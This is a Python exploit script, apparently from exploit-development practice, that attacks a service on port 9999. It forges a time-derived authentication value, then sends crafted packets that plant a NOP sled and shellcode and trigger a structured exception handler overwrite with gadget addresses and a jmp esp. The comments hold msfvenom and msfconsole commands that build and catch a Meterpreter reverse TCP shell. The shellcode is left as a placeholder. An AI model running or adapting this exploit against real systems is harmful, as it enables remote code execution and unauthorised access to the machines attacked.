import socket
import sys
from struct import pack
import time


def reverse_timing(timing):
    
    ecx = 0xa # Hard coded 0xa
    eax = 0x0 # Hard coded 0x0

    # xor edx, edx
    edx = 0

    # div ecx
    edx = (eax % ecx) # Store the remainder in edx
    eax = int(eax / ecx) # we div, we use int because of floating number
    
    # mov ebx, eax
    ebx = eax

    # Timing
    eax = int(timing) # Timing in eax

    # div ecx
    edx = (eax % ecx)  # Store the remainder in edx
    eax = int(eax/ecx) # we div, we use int because of floating number

    # mov edx, ebx
    edx = ebx

    # dec edi
    edi = 0
    edi = edi-1 & 0xFFFFFFFF

    # movzx esi, al
    esi = eax & 0xFF

    # mov eax, esi
    eax = esi

    # imul eax, esi
    eax = (eax * esi)

    # mov ecx, eax
    ecx = eax

    # imul ecx, esi
    ecx = (eax*esi)

    # mov edx, ecx
    edx = ecx

    # imul ecx, esi
    ecx = (ecx*esi)

    # and edx, 0FFFFFF00h
    edx = (edx & 0x0FFFFFF00)

    # shl edx, 4
    edx = edx << 4

    # or edx, eax
    edx = (edx | eax)

    # and edx, 0x0FFFFFFF0h
    edx = (edx & 0x0FFFFFFF0)

    # and ecx, 0FFFFF000h
    ecx = (ecx & 0x0FFFFF000)

    # shl ecx, 8
    ecx = (ecx << 8) & 0xFFFFFFFF

    # or edx, ecx
    edx = (edx | ecx) & 0xFFFFFFFF

    # shl edx, 4
    edx = (edx << 4) & 0xFFFFFFFF

    # or edx, esi
    edx = (edx | esi) & 0xFFFFFFFF

    # xor edx, 74829726h
    edx = edx ^ 0x74829726

    return edx


def readDataFile(server,port,timing_result):
    buf = pack("<L",timing_result)  # result value of reverse engineering the function used with timing
    buf += pack("<L",0x2) # opcode we control to go to fopen function to write data to file
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buf)
    s.close()

def writeToFile1(server,port,timing_result):
    buf = pack("<L",timing_result)  # result value of reverse engineering the function used with timing
    buf += pack("<L",0x1) # opcode we control to go to fopen function to write data to file
    nops = b"\x90" * 0x10

    # Bad Chars \x0a\x1a
    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.132.9 LPORT=443 -b "\x00\x0a\x1a" -f py -v shellcode --smallest
    # msfconsole -q -x "use multi/handler;  set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.132.7; set LPORT 443; exploit"
    shellcode =  b"YOURSHELLCODE"
    

    buf += nops + shellcode + bytearray([0x43]*(0x7ff-len(nops) - len(shellcode))) # Buffer we contol 0x7ff bytes.
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buf)
    s.close()

def writeToFile2(server,port,timing_result):
    buf = pack("<L",timing_result)  # result value of reverse engineering the function used with timing
    buf += pack("<L",0x1) # opcode we control to go to fopen function to write data to file
    buf += b"B" * 129 # Buffer offset to overwrite SEH
    buf += pack("<L",(0x09eb9090)) # NSEH # Short Jump
    buf += pack("<L",(0x60ae1091)) # SEH Control (EIP) # 0x60ae1091: pop ecx ; pop ebp ; ret
    padding = b"E" * 5
    setup_stack_shellcode = b"\x81\xEC\xC0\xF8\xFF\xFF" # sub esp,0xfffff8c0
    jmp_esp = pack("<L",(0xe4ff9090)) # jmp esp
    buf += padding + setup_stack_shellcode + jmp_esp + b"\x90" * (0x7ff - len(buf) - len(padding) - len(setup_stack_shellcode) - len(jmp_esp)) # Extra buffer payload
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buf)
    s.close()


def main():

    if len(sys.argv) != 2:
        print("Usage: %s <ip_address>\n" % (sys.argv[0]))
        sys.exit(1)

    server = sys.argv[1]
    port = 9999

    timing = time.time() # get time and give as value to function reverse_timing
    timing_result1 = int(reverse_timing(timing)) # reversed function return the value for timing
    writeToFile1(server,port,timing_result1)

    time.sleep(5)
    timing = time.time() # get time and give as value to function reverse_timing
    timing_result2 = int(reverse_timing(timing)) # reversed function return the value for timing
    writeToFile2(server,port,timing_result2)

    time.sleep(5)
    timing = time.time() # get time and give as value to function reverse_timing
    timing_result3 = int(reverse_timing(timing)) # reversed function return the value for timing
    readDataFile(server,port,timing_result3)

    time.sleep(0.2)
    
    print("[+] Packet Sent")
    sys.exit(0)

if __name__ == '__main__':
    main()